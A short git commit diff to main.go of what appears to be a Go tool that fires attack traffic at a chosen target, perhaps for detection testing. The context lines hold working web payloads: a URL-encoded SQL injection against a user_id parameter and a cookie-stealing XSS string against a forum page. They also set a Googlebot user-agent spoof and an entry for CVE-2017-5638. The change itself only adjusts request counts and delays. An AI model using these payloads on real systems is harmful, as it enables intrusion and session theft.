7a8442fc171abaa64eb483641f25693818a89d7a
jzarris <jackzarris@gmail.com>
2018-10-01 16:04:31 -0700

    Update main.go

--- main.go
+++ main.go
@@ -121,7 +121,8 @@ func (p *program) Start(s service.Service) error {
 		minRequests: 800, url: fmt.Sprintf("http://%s/?user_id=%s", target, "1029292%20OR%2019%3D19%20--%20-")}
 	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
-	impostor = Attack{name: "Impostor", method: "GET", maxNap: 0, minNap: 0, pause: 1, minRequests: 100, maxRequests: 150, url: fmt.Sprintf("http://%s/", target),//%svid.mov", target, RandomString(10)),
+	impostor = Attack{name: "Impostor", method: "GET", maxNap: 3, minNap: 1,
+		maxRequests: 50, minRequests: 10, url: fmt.Sprintf("http://%s/", target),//%svid.mov", target, RandomString(10)),
 		headers: map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}}
 	cve20175638 = Attack{name: "cve20175638", method: "GET", maxNap: 0, minNap: 0, pause: 1,
 		maxRequests: 1800, minRequests: 2, url: fmt.Sprintf("http://%s/", target),
